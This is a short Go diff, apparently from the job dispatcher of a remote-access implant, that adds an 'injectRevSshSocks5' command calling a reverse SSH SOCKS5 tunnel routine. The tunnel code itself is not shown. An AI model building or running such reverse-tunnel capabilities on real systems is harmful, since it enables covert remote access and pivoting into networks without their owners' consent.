@@ -218,6 +218,14 @@ func jobProcessor(){
 					}
 		   			contChannel <- "continue"
 
+		   		case "injectRevSshSocks5":
+
+		   			error,result = biterpreter.RevSshSocks5(job.Parameters)
+		   			if error{
+						result = "Error Injecting Reverse SSH Socks5:"+ result
+					}
+		   			contChannel <- "continue"
+
 		   		//Elevate
 
 		   		//SYSTEM Actions
